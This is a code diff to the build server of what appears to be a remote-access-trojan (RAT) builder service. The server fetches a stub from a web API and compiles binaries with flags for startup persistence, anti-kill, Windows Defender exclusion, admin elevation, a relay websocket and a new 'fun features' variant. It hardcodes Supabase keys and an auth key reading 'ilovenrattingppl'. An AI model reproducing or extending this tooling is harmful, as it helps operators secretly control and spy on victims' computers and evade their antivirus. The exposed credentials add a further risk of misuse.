@@ -36,8 +36,8 @@ API        = lambda p: f"{FRONTEND}/api/public/buildserver/{p}"
 WORK       = ROOT / "work"; WORK.mkdir(exist_ok=True)
 
 # Supabase / relay constants baked into builds
-SUPABASE_URL      = CFG.get("supabase_url", "https://mjgdkyjodvsjxywtdqfu.supabase.co")
-SUPABASE_ANON_KEY = CFG.get("supabase_anon_key", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1qZ2RreWpvZHZzanh5d3RkcWZ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE1MzE3ODksImV4cCI6MjA5NzEwNzc4OX0.JQrgThmhspokUEo4ODhFVOE_oQnqPim-N0961BIrr4Y")
+SUPABASE_URL      = CFG.get("supabase_url", "https://founhqrlavhqyggowlja.supabase.co")
+SUPABASE_ANON_KEY = CFG.get("supabase_anon_key", "sb_publishable_ItOxvbdn18MEra97VN5M9g_aSjo9cNU")
 HIDEN_AUTH_KEY     = CFG.get("hiden_auth_key", "ilovenrattingppl")
 
 C_DIM="\033[2m"; C_RED="\033[31m"; C_GRN="\033[32m"; C_YEL="\033[33m"
@@ -100,8 +100,9 @@ def progress(bid, pct, msg="", status="building"):
     except Exception as e:
         warn(f"progress error: {e}")
 
-def fetch_stub():
-    r = requests.get(API("stub"), headers=HEADERS, timeout=20)
+def fetch_stub(fun_features=False):
+    variant = "full" if fun_features else "lite"
+    r = requests.get(API("stub") + f"?variant={variant}", headers=HEADERS, timeout=20)
     r.raise_for_status()
     return r.json()["files"]
 
@@ -129,7 +130,7 @@ def build(b):
     info(f"▶ build {bid[:8]}… ({name} → bin:{safe_name}) for user {str(b.get('user_id',''))[:8]}…")
     progress(bid, 5, "fetching stub")
 
-    stub = fetch_stub()
+    stub = fetch_stub(b.get("fun_features", False))
     info(f"  stub files: {', '.join(stub.keys())}")
     feats = b.get("features", {}) or {}
     relay_url = b.get("relay_url", "wss://veltrix.hidenfree.com")
@@ -145,6 +146,7 @@ def build(b):
         "DEBUG":           "true" if b.get("debug") else "false",
         "FEATURE_STARTUP": "true" if b.get("startup") else "false",
         "FEATURE_ANTIKILL":"true" if b.get("antikill") else "false",
+        "FEATURE_FUN":     "true" if b.get("fun_features") else "false",
         "FEATURE_WD_EXCLUSION": "true" if b.get("wd_exclusion") else "false",
         "FEATURE_REQUIRE_ADMIN": "true" if b.get("require_admin") else "false",
         "BUILD_TAG":       rust_string(b.get("tag") or ""),
